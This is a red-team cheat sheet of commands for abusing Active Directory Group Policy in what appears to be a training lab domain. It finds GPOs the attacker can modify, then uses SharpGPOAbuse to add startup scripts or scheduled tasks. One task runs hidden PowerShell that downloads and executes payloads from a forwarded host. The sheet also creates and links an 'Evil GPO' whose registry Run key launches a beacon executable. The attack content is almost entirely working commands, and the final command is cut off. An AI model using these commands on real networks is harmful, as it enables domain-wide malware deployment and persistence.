# Modifying existing GPOs

```bash
# Finding GPOs
powerview
powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# Resolve GPO name ObjectDN from first command
powerpick Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

# Resolve SID name SecurityIdentifier from first command
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Search OUs for which the GPO applies to ObjectDN from first command
powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

# Get Computers on the OUs
powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get shares, anthing that is accessible by the current computer is fine
powerpick Find-DomainShare -CheckShareAccess

# Abuse the GPO for start up job
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
# or for immediate command
rportfwd 8080 127.0.0.1 80 # In wkstn-2
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "DEV\nlamb" --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"iex ((new-object net.webclient).downloadstring('http://wkstn-2:8080/bypass')); iex ((new-object net.webclient).downloadstring('http://wkstn-2:8080/ab'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName "web.dev.cyberbotic.io" --Force
```

---

# Creating and Linking a GPO

```bash
# Check which group can create GPOs
powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# Check if we have WriteProperty privileges
powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

# Convert SID
powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# List GPO Commands
powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# Creating a new GPO
powershell New-GPO -Name "Evil GPO"

# Add Autorun
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

# Link the created GPO
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target
```
